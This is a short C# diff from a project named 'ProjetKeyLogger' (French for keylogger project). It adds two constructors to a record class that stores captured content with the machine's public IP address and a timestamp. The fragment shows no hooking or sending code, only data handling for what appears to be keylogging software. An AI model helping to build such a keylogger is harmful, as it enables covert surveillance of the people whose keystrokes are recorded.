@@ -11,6 +11,22 @@ namespace ProjetKeyLogger
         private String date;
         private String adresse_ip_publique;
 
+        public Enregistrement()
+        {
+
+        }
+
+        public Enregistrement(String contenu)
+        {
+            this.contenu = contenu;
+
+            //On définit l'adresse ip publique
+            this.adresseIpPublique();
+
+            //mise a jour de la date
+            this.dateTimeNow();
+        }
+
         //proprieté en lecture / ecriture
         public String Contenu
         {
